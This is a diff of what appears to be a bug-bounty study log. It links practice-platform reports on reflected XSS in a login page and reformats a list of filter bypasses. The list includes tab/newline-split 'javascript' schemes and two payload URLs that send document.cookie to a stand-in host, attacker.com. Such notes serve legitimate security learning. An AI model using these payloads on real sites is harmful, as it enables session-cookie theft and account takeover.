@@ -248,17 +248,22 @@ Date - 8/11/2021
 	- https://www.bugbountyhunter.com/hackevents/report?id=308 (Reflective XSS on login.php via goto parameter)-(panya)
 	- https://www.bugbountyhunter.com/hackevents/report?id=343 ( Reflective XSS on login.php via goto parameter after successful login)-(panya) (report not so good)
 	- https://www.bugbountyhunter.com/hackevents/report?id=154 (Reflective XSS on /login.php endpoint through the vulnerable `ref` parameter)-(holybugx) (quality report) 👌🏻 (bypass for xss are awesome)
-			Bypasses
-				\_ja%09vascript
-				\_ja%0avascript
-				\_ja%0dvascript
-				\_http://firstbloodhackers.com/login.php?ref=ja%09vascript:window.location.href=%60http://attacker.com/$%7Bdocument.cookie%7D%60
-				\_http://firstbloodhackers.com/login.php?ref=ja	vascript:window.location.href=`http://attacker.com/${document.cookie}`
-				\_%09 -> Tab
-				\_%60 -> `
-				\_%7B - > {
-				\_%7D - }
-				\_%60 -> `
+
+Bypasses
+
+````
+				- ja%09vascript
+				- ja%0avascript
+				- ja%0dvascript
+				- http://firstbloodhackers.com/login.php?ref=ja%09vascript:window.location.href=%60http://attacker.com/$%7Bdocument.cookie%7D%60
+				- http://firstbloodhackers.com/login.php?ref=ja	vascript:window.location.href=`http://attacker.com/${document.cookie}`
+				- %09 -> Tab
+				- %60 -> `
+				- %7B - > {
+				- %7D - }
+				- %60 -> `
+				
+````
 
 - [x] #want to create some usefull tool (if possible) ✅
 - [x] #try to do some manual recon on BugBounty program / JS recon ✅
